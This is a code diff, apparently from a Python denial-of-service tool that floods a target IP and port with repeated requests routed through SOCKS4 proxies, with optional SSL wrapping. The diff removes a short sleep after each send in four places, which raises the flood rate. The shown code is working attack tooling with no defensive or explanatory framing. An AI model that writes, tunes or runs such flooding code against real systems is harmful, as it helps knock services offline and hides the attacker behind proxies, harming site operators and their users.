@@ -196,7 +196,6 @@ def run():
             s = socks.socksocket()
             s.connect((str(ip), int(port)))
             s.send(str.encode(request))
-            time.sleep(0.03)
             print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
             try:
                 for y in range(multiple):
@@ -209,7 +208,6 @@ def run():
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                 s.connect((str(ip), int(port)))
                 s.send(str.encode(request))
-		time.sleep(0.03)
                 print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
                 try:
                     for y in range(multiple):
@@ -233,7 +231,6 @@ def run2():
 				s = ssl.wrap_socket(socks.socksocket())
 				s.connect((str(ip), int(port)))
 				s.send(str.encode(request))
-				time.sleep(0.03)
 				print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
 				try:
 					for y in range(multiple):
@@ -246,7 +243,6 @@ def run2():
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 					s.connect((str(ip), int(port)))
 					s.send(str.encode(request))
-					time.sleep(0.03)
 					print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
 					try:
 						for y in range(multiple):
